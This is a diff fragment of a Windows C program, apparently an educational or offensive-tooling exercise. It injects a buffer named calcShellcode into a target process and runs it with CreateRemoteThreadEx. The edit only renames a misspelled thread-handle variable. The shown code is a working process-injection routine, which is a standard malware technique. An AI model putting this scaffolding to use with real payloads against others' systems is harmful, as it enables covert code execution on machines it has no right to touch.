@@ -72,23 +72,23 @@ int main(int argc, char* argv[]){
     printf("%s wrote %zu-byte to process memory\n", k, sizeof(calcShellcode));
 
     /* create a remote thread in the process */
-    hTread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, &TID);
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, &TID);
 
-    if (hTread == NULL){
+    if (hThread == NULL){
         printf("%s Creating a thread failed: %ld\n", e, GetLastError());
         VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
 
-    printf("%s Got a handle to the thread(%ld)\n\\---0x%p\n", k, TID, hTread);
+    printf("%s Got a handle to the thread(%ld)\n\\---0x%p\n", k, TID, hThread);
 
     
-    WaitForSingleObject(hTread, INFINITE);
+    WaitForSingleObject(hThread, INFINITE);
     printf("%s Thread finished\n", k);
 
     printf("%s cleaning up\n", i);
-    CloseHandle(hTread);
+    CloseHandle(hThread);
     VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
     CloseHandle(hProcess);
     printf("%s Done\n", k);
